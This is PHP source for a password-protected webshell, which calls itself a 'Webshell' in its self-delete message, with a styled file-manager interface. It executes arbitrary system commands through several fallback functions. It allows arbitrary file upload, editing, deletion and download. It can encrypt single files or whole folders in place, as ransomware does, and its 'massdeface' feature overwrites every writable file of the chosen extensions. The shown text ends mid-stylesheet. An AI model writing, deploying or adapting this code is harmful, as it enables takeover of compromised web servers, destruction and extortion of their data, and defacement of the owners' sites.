<?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

$p = "cyrenpogi";
if (isset($_POST['pass']) && $_POST['pass'] == $p) {
    $_SESSION['auth'] = 1;
    $_SESSION['login_time'] = time();
}

if (!isset($_SESSION['auth']) || !isset($_SESSION['login_time']) || (time() - $_SESSION['login_time']) > 86400) {
    if (isset($_SESSION['auth'])) {
        session_destroy();
        session_start();
    }
    echo '<!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%); 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            padding: 20px;
        }
        .login-container {
            width: 100%;
            max-width: 420px;
            background: rgba(25, 25, 35, 0.95);
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 15px 35px rgba(0, 255, 100, 0.15),
                        0 0 0 1px rgba(0, 255, 100, 0.1);
            border: 1px solid rgba(0, 255, 100, 0.3);
            backdrop-filter: blur(10px);
        }
        .login-title {
            color: #00ff88;
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 30px;
            letter-spacing: 1px;
            text-shadow: 0 0 10px rgba(0, 255, 100, 0.5);
        }
        .login-input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(15, 20, 25, 0.9);
            border: 2px solid rgba(0, 255, 100, 0.4);
            border-radius: 12px;
            color: #00ff88;
            font-size: 16px;
            margin-bottom: 25px;
            transition: all 0.3s ease;
            outline: none;
        }
        .login-input:focus {
            border-color: #00ff88;
            box-shadow: 0 0 0 3px rgba(0, 255, 100, 0.2);
            background: rgba(20, 25, 35, 0.95);
        }
        .login-input::placeholder {
            color: rgba(0, 255, 100, 0.5);
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%);
            border: none;
            border-radius: 12px;
            color: #001a0f;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
        }
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 255, 100, 0.4);
            background: linear-gradient(135deg, #00ff99 0%, #00dd77 100%);
        }
        .login-btn:active {
            transform: translateY(0);
        }
        .logo {
            text-align: center;
            font-size: 50px;
            margin-bottom: 20px;
            color: #00ff88;
            filter: drop-shadow(0 0 8px rgba(0, 255, 100, 0.7));
        }
        .copyright {
            text-align: center;
            color: rgba(0, 255, 100, 0.4);
            font-size: 12px;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid rgba(0, 255, 100, 0.1);
        }
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
                border-radius: 16px;
            }
            .login-title {
                font-size: 24px;
            }
            .login-input {
                padding: 14px 18px;
            }
            .login-btn {
                padding: 15px;
            }
        }
    </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">🔐</div>
            <h2 class="login-title">SYSTEM ACCESS</h2>
            <form method="post">
                <input type="password" name="pass" class="login-input" placeholder="Enter Password" required autocomplete="off">
                <button type="submit" class="login-btn">🔑 LOGIN</button>
            </form>
            <div class="copyright">© Secure Access v2.0</div>
        </div>
    </body>
    </html>';
    exit();
}

$action = isset($_GET['a']) ? $_GET['a'] : 'index';
$path = isset($_GET['p']) ? $_GET['p'] : '.';
if (strpos($path, '..') !== false || !is_dir($path)) {
    $path = '.';
}
$path = realpath($path) ? realpath($path) : '.';

function exe($c) {
    $d = '';
    if (function_exists('popen')) {
        $h = @popen($c . ' 2>&1', 'r');
        if ($h) {
            while (!feof($h)) {
                $d .= fread($h, 4096);
            }
            pclose($h);
        }
    } elseif (function_exists('proc_open')) {
        $ds = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
        );
        $pr = @proc_open($c, $ds, $pi);
        if (is_resource($pr)) {
            fclose($pi[0]);
            $d = stream_get_contents($pi[1]);
            fclose($pi[1]);
            fclose($pi[2]);
            proc_close($pr);
        }
    } elseif (function_exists('system')) {
        ob_start();
        @system($c . ' 2>&1');
        $d = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $d = @shell_exec($c . ' 2>&1');
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($c . ' 2>&1');
        $d = ob_get_clean();
    } elseif (function_exists('exec')) {
        @exec($c . ' 2>&1', $o);
        $d = implode("\n", $o);
    }
    if (empty($d)) {
        $d = "Command executed (no output)";
    }
    return $d;
}

function listFiles($p) {
    $r = array();
    if (is_dir($p) && $h = @opendir($p)) {
        while (($f = readdir($h)) !== false) {
            if ($f == '.' || $f == '..') continue;
            $fp = $p . DIRECTORY_SEPARATOR . $f;
            if (is_readable($fp)) {
                $r[] = array(
                    'name' => $f,
                    'path' => $fp,
                    'is_dir' => @is_dir($fp),
                    'size' => @filesize($fp),
                    'perm' => substr(sprintf('%o', @fileperms($fp)), -4),
                    'time' => @filemtime($fp) ? date('Y-m-d H:i:s', @filemtime($fp)) : 'Unknown'
                );
            }
        }
        closedir($h);
    }
    usort($r, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $r;
}

define('ENCRYPTION_MAGIC', 'ENCRYPTEDv1.0');

function isEncrypted($file) {
    if (!@is_file($file) || !is_readable($file)) return false;
    $handle = @fopen($file, 'rb');
    if (!$handle) return false;
    $signature = @fread($handle, strlen(ENCRYPTION_MAGIC));
    fclose($handle);
    return $signature === ENCRYPTION_MAGIC;
}

function encryptFile($file, $pass) {
    if (!@is_file($file) || !is_readable($file) || !is_writable($file)) {
        return false;
    }
    if (isEncrypted($file)) {
        return false;
    }
    $data = @file_get_contents($file);
    if ($data === false) return false;
    $salt = openssl_random_pseudo_bytes(16);
    $key = hash_pbkdf2('sha256', $pass, $salt, 10000, 32, true);
    $iv = openssl_random_pseudo_bytes(16);
    $enc = openssl_encrypt($data, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
    if ($enc === false) return false;
    $version = pack('V', 1);
    $result = @file_put_contents($file, ENCRYPTION_MAGIC . $version . $salt . $iv . $tag . $enc, LOCK_EX);
    return $result !== false;
}

function decryptFile($file, $pass) {
    if (!@is_file($file) || !is_readable($file) || !is_writable($file)) {
        return false;
    }
    if (!isEncrypted($file)) {
        return false;
    }
    $data = @file_get_contents($file);
    if ($data === false) return false;
    $offset = strlen(ENCRYPTION_MAGIC) + 4;
    $salt = substr($data, $offset, 16);
    $iv = substr($data, $offset + 16, 16);
    $tag = substr($data, $offset + 32, 16);
    $enc = substr($data, $offset + 48);
    $key = hash_pbkdf2('sha256', $pass, $salt, 10000, 32, true);
    $dec = openssl_decrypt($enc, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
    if ($dec === false) return false;
    $result = @file_put_contents($file, $dec, LOCK_EX);
    return $result !== false;
}

function massDeface($dir, $method, $content, $extensions) {
    $exts = array_map('trim', explode(',', strtolower($extensions)));
    $count = 0;
    if ($method == 'upload' && isset($_FILES['deface_file']['tmp_name']) && is_uploaded_file($_FILES['deface_file']['tmp_name'])) {
        $upload_content = file_get_contents($_FILES['deface_file']['tmp_name']);
        if ($upload_content === false) return 0;
    }
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($it as $item) {
        if ($item->isFile() && $item->isWritable()) {
            $ext = strtolower(pathinfo($item->getPathname(), PATHINFO_EXTENSION));
            if (in_array($ext, $exts)) {
                if ($method == 'upload') {
                    if (isset($upload_content)) {
                        if (file_put_contents($item->getPathname(), $upload_content) !== false) {
                            $count++;
                        }
                    }
                } elseif ($method == 'code' && !empty($content)) {
                    if (file_put_contents($item->getPathname(), $content) !== false) {
                        $count++;
                    }
                }
            }
        }
    }
    return $count;
}

function createZip($files, $zipName) {
    if (!class_exists('ZipArchive')) {
        return false;
    }
    $zip = new ZipArchive();
    if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        return false;
    }
    foreach ($files as $file) {
        if (file_exists($file)) {
            if (is_dir($file)) {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($it as $item) {
                    if ($item->isFile() && $item->isReadable()) {
                        $localPath = str_replace(dirname($file) . DIRECTORY_SEPARATOR, '', $item->getPathname());
                        $zip->addFile($item->getPathname(), $localPath);
                    }
                }
            } elseif (is_file($file) && is_readable($file)) {
                $zip->addFile($file, basename($file));
            }
        }
    }
    return $zip->close();
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['a'])) {
    switch ($_POST['a']) {
        case 'upload':
            if (isset($_FILES['upload']) && is_array($_FILES['upload']['tmp_name'])) {
                $uploaded = 0;
                foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
                    if ($_FILES['upload']['error'][$k] == 0 && is_uploaded_file($tmp)) {
                        $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name'][$k]);
                        if (move_uploaded_file($tmp, $dest)) {
                            $uploaded++;
                        }
                    }
                }
                if ($uploaded > 0) {
                    $_SESSION['message'] = $uploaded . ' file(s) uploaded successfully!';
                }
            }
            break;
        case 'newfile':
            if (!empty($_POST['filename'])) {
                $filename = trim(basename($_POST['filename']));
                if (!empty($filename)) {
                    $fullpath = $path . DIRECTORY_SEPARATOR . $filename;
                    if (touch($fullpath)) {
                        $_SESSION['message'] = 'File "' . htmlspecialchars($filename) . '" created!';
                    }
                }
            }
            break;
        case 'newfolder':
            if (!empty($_POST['foldername'])) {
                $foldername = trim(basename($_POST['foldername']));
                if (!empty($foldername)) {
                    $fullpath = $path . DIRECTORY_SEPARATOR . $foldername;
                    if (!file_exists($fullpath) && mkdir($fullpath, 0755, true)) {
                        $_SESSION['message'] = 'Folder "' . htmlspecialchars($foldername) . '" created!';
                    }
                }
            }
            break;
        case 'delete':
            if (isset($_POST['f']) && file_exists($_POST['f'])) {
                $f = $_POST['f'];
                if (is_file($f) && is_writable($f)) {
                    if (unlink($f)) {
                        $_SESSION['message'] = 'File deleted!';
                    }
                } elseif (is_dir($f) && is_writable(dirname($f))) {
                    $it = new RecursiveDirectoryIterator($f, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($files as $file) {
                        if ($file->isDir()){
                            rmdir($file->getRealPath());
                        } else {
                            unlink($file->getRealPath());
                        }
                    }
                    if (rmdir($f)) {
                        $_SESSION['message'] = 'Directory deleted!';
                    }
                }
            }
            break;
        case 'batchdelete':
            if (isset($_POST['selected_files']) && is_array($_POST['selected_files'])) {
                $deleted = 0;
                foreach ($_POST['selected_files'] as $file) {
                    if (file_exists($file) && is_writable($file)) {
                        if (is_file($file)) {
                            if (unlink($file)) $deleted++;
                        } elseif (is_dir($file)) {
                            $it = new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS);
                            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                            foreach($files as $f) {
                                if ($f->isDir()){
                                    rmdir($f->getRealPath());
                                } else {
                                    unlink($f->getRealPath());
                                }
                            }
                            if (rmdir($file)) $deleted++;
                        }
                    }
                }
                $_SESSION['message'] = $deleted . ' item(s) deleted!';
            }
            break;
        case 'batchzip':
            if (isset($_POST['selected_files']) && is_array($_POST['selected_files']) && !empty($_POST['selected_files'])) {
                $zipName = $path . DIRECTORY_SEPARATOR . 'batch_' . date('Y-m-d_H-i-s') . '.zip';
                if (createZip($_POST['selected_files'], $zipName)) {
                    $_SESSION['message'] = 'Zip created: ' . basename($zipName);
                } else {
                    $_SESSION['error'] = 'Failed to create zip!';
                }
            }
            break;
        case 'rename':
            if (isset($_POST['old']) && isset($_POST['new']) && file_exists($_POST['old'])) {
                $old = $_POST['old'];
                $new = dirname($old) . DIRECTORY_SEPARATOR . basename($_POST['new']);
                if (rename($old, $new)) {
                    $_SESSION['message'] = 'Renamed successfully!';
                }
            }
            break;
        case 'chmod':
            if (isset($_POST['f'], $_POST['perm']) && file_exists($_POST['f'])) {
                $file = $_POST['f'];
                $perm = $_POST['perm'];
                $realFile = realpath($file);
                $realCurrent = realpath($path);
                if (!$realFile || strpos($realFile, $realCurrent) !== 0) {
                    $_SESSION['error'] = 'Invalid file path!';
                    break;
                }
                if (!preg_match('/^[0-7]{3,4}$/', $perm)) {
                    $_SESSION['error'] = 'Invalid permission format! Use 3-4 digits (0-7)';
                    break;
                }
                if (strlen($perm) == 3) {
                    $perm = '0' . $perm;
                }
                $mode = octdec($perm);
                $filename = basename($file);
                $dangerousFiles = ['.htaccess', '.htpasswd', 'wp-config.php', 'config.php', 'database.php'];
                if (in_array($filename, $dangerousFiles) && $perm == '0777') {
                    $_SESSION['error'] = 'Cannot set 0777 on critical file: ' . $filename;
                    break;
                }
                if (chmod($file, $mode)) {
                    $_SESSION['message'] = 'Permissions changed to ' . $perm . '!';
                } else {
                    $_SESSION['error'] = 'Failed to change permissions!';
                }
            }
            break;
        case 'saveedit':
            if (isset($_POST['f'], $_POST['content']) && file_exists($_POST['f']) && is_writable($_POST['f'])) {
                if (file_put_contents($_POST['f'], $_POST['content']) !== false) {
                    $_SESSION['message'] = 'File saved successfully!';
                }
            }
            break;
        case 'encryptfile':
            if (isset($_POST['f'], $_POST['pass']) && file_exists($_POST['f'])) {
                $pass = trim($_POST['pass']);
                if (!empty($pass)) {
                    if (encryptFile($_POST['f'], $pass)) {
                        $_SESSION['message'] = 'File encrypted successfully!';
                    } else {
                        $_SESSION['error'] = 'Encryption failed! Check permissions or file may already be encrypted.';
                    }
                }
            }
            break;
        case 'decryptfile':
            if (isset($_POST['f'], $_POST['pass']) && file_exists($_POST['f'])) {
                $pass = trim($_POST['pass']);
                if (!empty($pass)) {
                    if (decryptFile($_POST['f'], $pass)) {
                        $_SESSION['message'] = 'File decrypted successfully!';
                    } else {
                        $_SESSION['error'] = 'Decryption failed! Wrong password or file not encrypted.';
                    }
                }
            }
            break;
        case 'encryptfolder':
            if (isset($_POST['epass'])) {
                $pass = trim($_POST['epass']);
                $files = listFiles($path);
                $encrypted = 0;
                foreach ($files as $f) {
                    if (!$f['is_dir'] && is_writable($f['path']) && !isEncrypted($f['path'])) {
                        if (encryptFile($f['path'], $pass)) {
                            $encrypted++;
                        }
                    }
                }
                $_SESSION['message'] = $encrypted . ' files encrypted!';
            }
            break;
        case 'decryptfolder':
            if (isset($_POST['dpass'])) {
                $pass = trim($_POST['dpass']);
                $files = listFiles($path);
                $decrypted = 0;
                foreach ($files as $f) {
                    if (!$f['is_dir'] && is_writable($f['path']) && isEncrypted($f['path'])) {
                        if (decryptFile($f['path'], $pass)) {
                            $decrypted++;
                        }
                    }
                }
                $_SESSION['message'] = $decrypted . ' files decrypted!';
            }
            break;
        case 'massdeface':
            if (isset($_POST['extensions']) && !empty($_POST['extensions'])) {
                $count = massDeface($path, $_POST['method'], $_POST['code'] ?? '', $_POST['extensions']);
                $_SESSION['message'] = 'Mass deface completed on ' . $count . ' files!';
            }
            break;
        case 'selfdestruct':
            if (file_exists(__FILE__) && is_writable(__FILE__)) {
                if (unlink(__FILE__)) {
                    session_destroy();
                    die('<script>alert("Webshell deleted!"); window.close();</script>');
                }
            }
            break;
        case 'exec':
            $_SESSION['terminal_output'] = exe($_POST['cmd']);
            $_SESSION['last_command'] = $_POST['cmd'];
            $action = 'terminal';
            break;
    }
    if ($_POST['a'] != 'exec') {
        header('Location: ?a=' . urlencode($action) . '&p=' . urlencode($path));
        exit();
    }
}

if ($action == 'download' && isset($_GET['f']) && file_exists($_GET['f']) && is_file($_GET['f'])) {
    $file = $_GET['f'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

if ($action == 'getfile' && isset($_GET['f']) && file_exists($_GET['f']) && is_file($_GET['f']) && is_readable($_GET['f'])) {
    $file = $_GET['f'];
    $content = file_get_contents($file);
    if ($content !== false) {
        header('Content-Type: text/plain; charset=utf-8');
        echo $content;
    } else {
        http_response_code(500);
        echo "Error reading file";
    }
    exit;
}

echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>🔐 File Manager</title>
    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
    }
    :root {
        --primary: #00ff88;
        --primary-dark: #00cc66;
        --primary-light: rgba(0, 255, 136, 0.1);
        --bg: #0a0a0f;
        --bg-light: #121218;
        --bg-lighter: #1a1a22;
        --text: #e0e0ff;
        --text-secondary: #a0a0c0;
        --danger: #ff4444;
        --warning: #ffaa44;
        --success: #00ff88;
        --border: rgba(0, 255, 136, 0.3);
        --shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        --radius: 12px;
        --radius-sm: 8px;
    }
    body {
        background: var(--bg);
        color: var(--text);
        font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "SF Pro Text", Roboto, sans-serif;
        line-height: 1.5;
        font-size: 15px;
        min-height: 100vh;
        overflow-x: hidden;
    }
    .app-container {
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        max-width: 100%;
        margin: 0 auto;
    }
    .app-header {
        background: rgba(10, 10, 15, 0.95);
        backdrop-filter: blur(20px);
        border-bottom: 1px solid var(--border);
        padding: 16px 20px;
        position: sticky;
        top: 0;
        z-index: 1000;
        display: flex;
        align-items: center;
        justify-content: space-between;
        flex-wrap: wrap;
        gap: 15px;
    }
    .header-left {
        display: flex;
        align-items: center;
        gap: 15px;
        flex: 1;
        min-width: 0;
    }
    .header-title {
        color: var(--primary);
        font-size: 22px;
        font-weight: 700;
        display: flex;
        align-items: center;
        gap: 10px;
        white-space: nowrap;
    }
    .header-title::before {
        content: "🔐";
        font-size: 24px;
    }
    .current-path {
        background: var(--bg-light);
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        padding: 10px 15px;
        font-family: "SF Mono", "Cascadia Code", monospace;
        font-size: 13px;
        color: var(--text-secondary);
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        flex: 1;
        min-width: 0;
    }
    .header-actions {
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
    }
    .tabs-container {
        display: flex;
        overflow-x: auto;
        padding: 10px 20px;
        background: var(--bg-light);
        border-bottom: 1px solid var(--border);
        gap: 8px;
        -webkit-overflow-scrolling: touch;
        scrollbar-width: none;
    }
    .tabs-container::-webkit-scrollbar {
        display: none;
    }
    .tab-btn {
        padding: 14px 22px;
        background: var(--bg-lighter);
        color: var(--text-secondary);
        border: 1px solid transparent;
        border-radius: var(--radius);
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
        white-space: nowrap;
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        min-height: 50px;
    }
    .tab-btn:hover {
        background: rgba(0, 255, 136, 0.1);
        color: var(--primary);
        transform: translateY(-2px);
    }
    .tab-btn.active {
        background: rgba(0, 255, 136, 0.2);
        color: var(--primary);
        border-color: var(--primary);
        box-shadow: 0 5px 15px rgba(0, 255, 136, 0.2);
    }
    .tab-btn.danger {
        background: rgba(255, 68, 68, 0.1);
        color: var(--danger);
    }
    .tab-btn.danger:hover {
        background: rgba(255, 68, 68, 0.2);
    }
    .main-content {
        flex: 1;
        padding: 20px;
        max-width: 1400px;
        margin: 0 auto;
        width: 100%;
    }
    .tab-content {
        display: none;
        animation: fadeIn 0.3s ease;
    }
    .tab-content.active {
        display: block;
    }
    .path-nav {
        background: var(--bg-light);
        border-radius: var(--radius);
        padding: 20px;
        margin-bottom: 25px;
        border: 1px solid var(--border);
        display: flex;
        flex-direction: column;
        gap: 15px;
    }
    .path-form {
        display: flex;
        gap: 10px;
        width: 100%;
    }
    .path-input {
        flex: 1;
        padding: 14px 18px;
        background: var(--bg);
        border: 2px solid var(--border);
        border-radius: var(--radius-sm);
        color: var(--primary);
        font-size: 15px;
        font-family: monospace;
        min-width: 0;
    }
    .path-input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.2);
    }
    .path-btn {
        padding: 14px 24px;
        background: var(--primary);
        color: #000;
        border: none;
        border-radius: var(--radius-sm);
        font-weight: 700;
        font-size: 15px;
        cursor: pointer;
        white-space: nowrap;
        transition: all 0.3s ease;
    }
    .path-btn:hover {
        background: var(--primary-dark);
        transform: translateY(-2px);
    }
    .quick-actions {
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
    }
    .quick-btn {
        padding: 12px 20px;
        background: var(--bg-lighter);
        color: var(--text);
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        font-size: 14px;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 8px;
        transition: all 0.2s ease;
    }
    .quick-btn:hover {
        background: rgba(0, 255, 136, 0.1);
        color: var(--primary);
    }
    .upload-box {
        background: var(--bg-light);
        border-radius: var(--radius);
        padding: 25px;
        margin-bottom: 25px;
        border: 1px solid var(--border);
    }
    .section-title {
        color: var(--primary);
        font-size: 18px;
        font-weight: 700;
        margin-bottom: 20px;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .create-forms {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: 20px;
        margin-bottom: 25px;
    }
    .create-form {
        background: var(--bg-light);
        border-radius: var(--radius);
        padding: 20px;
        border: 1px solid var(--border);
    }
    .form-input {
        width: 100%;
        padding: 14px 18px;
        background: var(--bg);
        border: 2px solid var(--border);
        border-radius: var(--radius-sm);
        color: var(--text);
        font-size: 15px;
        margin-bottom: 15px;
        transition: all 0.3s ease;
    }
    .form-input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.2);
    }
    .btn-primary {
        width: 100%;
        padding: 16px;
        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
        color: #000;
        border: none;
        border-radius: var(--radius-sm);
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
    }
    .btn-primary:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(0, 255, 136, 0.4);
    }
    .files-container {
        background: var(--bg-light);
        border-radius: var(--radius);
        padding: 20px;
        border: 1px solid var(--border);
    }
    .files-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
        flex-wrap: wrap;
        gap: 15px;
    }
    .files-count {
        color: var(--text-secondary);
        font-size: 14px;
    }
    .batch-controls {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 10px 15px;
        background: rgba(0, 255, 136, 0.05);
        border: 1px solid rgba(0, 255, 136, 0.2);
        border-radius: var(--radius-sm);
        margin-bottom: 15px;
        flex-wrap: wrap;
    }
    .batch-checkbox {
        width: 18px;
        height: 18px;
        accent-color: var(--primary);
        cursor: pointer;
    }
    .batch-label {
        font-size: 14px;
        color: var(--text-secondary);
        white-space: nowrap;
    }
    .batch-actions {
        display: flex;
        gap: 8px;
        margin-left: auto;
        flex-wrap: wrap;
    }
    .batch-btn {
        padding: 8px 16px;
        background: rgba(0, 255, 136, 0.1);
        color: var(--primary);
        border: 1px solid rgba(0, 255, 136, 0.3);
        border-radius: var(--radius-sm);
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s ease;
        white-space: nowrap;
    }
    .batch-btn:hover {
        background: rgba(0, 255, 136, 0.2);
    }
    .batch-btn.danger {
        background: rgba(255, 68, 68, 0.1);
        color: var(--danger);
        border-color: rgba(255, 68, 68, 0.3);
    }
    .batch-btn.danger:hover {
        background: rgba(255, 68, 68, 0.2);
    }
    .file-list {
        display: flex;
        flex-direction: column;
        gap: 12px;
    }
    .file-item {
        background: var(--bg-lighter);
        border-radius: var(--radius-sm);
        padding: 18px 20px;
        border: 1px solid transparent;
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        gap: 15px;
        flex-wrap: wrap;
    }
    .file-item:hover {
        border-color: var(--primary);
        background: rgba(0, 255, 136, 0.05);
        transform: translateX(5px);
    }
    .file-checkbox {
        width: 18px;
        height: 18px;
        accent-color: var(--primary);
        cursor: pointer;
        flex-shrink: 0;
    }
    .file-icon {
        font-size: 24px;
        width: 40px;
        text-align: center;
        flex-shrink: 0;
    }
    .file-info {
        flex: 1;
        min-width: 0;
    }
    .file-name {
        font-weight: 600;
        font-size: 16px;
        margin-bottom: 6px;
        color: var(--text);
        word-break: break-word;
    }
    .file-details {
        font-size: 13px;
        color: var(--text-secondary);
        display: flex;
        gap: 15px;
        flex-wrap: wrap;
    }
    .file-detail {
        display: flex;
        align-items: center;
        gap: 5px;
    }
    .file-actions {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
    }
    .file-btn {
        padding: 10px 16px;
        background: rgba(0, 255, 136, 0.1);
        color: var(--primary);
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s ease;
        white-space: nowrap;
        display: flex;
        align-items: center;
        gap: 6px;
    }
    .file-btn:hover {
        background: rgba(0, 255, 136, 0.2);
        transform: translateY(-2px);
    }
    .file-btn.danger {
        background: rgba(255, 68, 68, 0.1);
        color: var(--danger);
        border-color: rgba(255, 68, 68, 0.3);
    }
    .file-btn.danger:hover {
        background: rgba(255, 68, 68, 0.2);
    }
    .terminal-box {
        background: #000;
        border-radius: var(--radius);
        padding: 0;
        overflow: hidden;
        border: 1px solid var(--primary);
        margin-bottom: 25px;
    }
    .terminal-header {
        background: var(--primary);
        color: #000;
        padding: 15px 20px;
        font-weight: 700;
        font-size: 16px;
        display: flex;
        align-items: center;
        justify-content: space-between;
    }
    .terminal-body {
        padding: 20px;
    }
    .terminal-form {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
    }
    .terminal-input {
        flex: 1;
        padding: 14px 18px;
        background: #111;
        border: 2px solid var(--primary);
        border-radius: var(--radius-sm);
        color: var(--primary);
        font-family: "SF Mono", monospace;
        font-size: 15px;
    }
    .terminal-output {
        background: #000;
        color: var(--primary);
        padding: 20px;
        border-radius: var(--radius-sm);
        font-family: "SF Mono", monospace;
        font-size: 14px;
        line-height: 1.6;
        white-space: pre-wrap;
        word-break: break-word;
        max-height: 500px;
        overflow-y: auto;
        border: 1px solid #222;
    }
    .deface-box {
        background: var(--bg-light);
        border-radius: var(--radius);
        padding: 25px;
        margin-bottom: 25px;
        border: 1px solid var(--border);
    }
    .deface-method {
        display: flex;
        gap: 15px;
        margin-bottom: 20px;
        flex-wrap: wrap;
    }
    .method-btn {
        padding: 12px 24px;
        background: var(--bg-lighter);
        color: var(--text);
        border: 1px solid var(--border);
        border-radius: var(--radius-sm);
        cursor: pointer;
        transition: all 0.3s ease;
        flex: 1;
        text-align: center;
        min-width: 140px;
    }
    .method-btn.active {
        background: rgba(255, 68, 68, 0.1);
        color: var(--danger);
        border-color: var(--danger);
    }
    .deface-section {
        display: none;
    }
    .deface-section.active {
        display: block;
        animation: fadeIn 0.3s ease;
    }
    .modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.95);
        z-index: 9999;
        padding: 20px;
        overflow-y: auto;
    }
    .modal-content {
        background: var(--bg-light);
        margin: 20px auto;
        max-width: 900px;
        border-radius: var(--radius);
        border: 2px solid var(--primary);
        overflow: hidden;
    }
    .modal-header {
        background: var(--primary);
        color: #000;
        padding: 20px;
        font-weight: 700;
        font-size: 18px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .modal-body {
        padding: 25px;
    }
    .modal-textarea {
        width: 100%;
        height: 500px;
        background: #000;
        color: var(--primary);
        border: 2px solid var(--border);
        border-radius: var(--radius-sm);
        padding: 20px;
        font-family: "SF Mono", monospace;
        font-size: 14px;
        resize: vertical;
        white-space: pre;
        tab-size: 4;
    }
    .modal-actions {
        display: flex;
        gap: 15px;
        justify-content: flex-end;
        margin-top: 25px;
        padding-top: 25px;
        border-top: 1px solid var(--border);
    }
    .encrypt-modal {
        background: var(--bg-light);
        border-radius: var(--radius);
        padding: 30px;
        max-width: 500px;
        margin: 50px auto;
        border: 2px solid var(--primary);
    }
    .encrypt-input {
        width: 100%;
        padding: 16px 20px;
        background: var(--bg);
        border: 2px solid var(--border);
        border-radius: var(--radius-sm);
        color: var(--text);
        font-size: 16px;
        margin: 20px 0;
    }
    .message {
        padding: 16px 20px;
        border-radius: var(--radius-sm);
        margin-bottom: 25px;
        font-weight: 600;
        display: flex;
        align-items: center;
        gap: 12px;
        animation: slideIn 0.3s ease;
    }
    .message.success {
        background: rgba(0, 255, 136, 0.1);
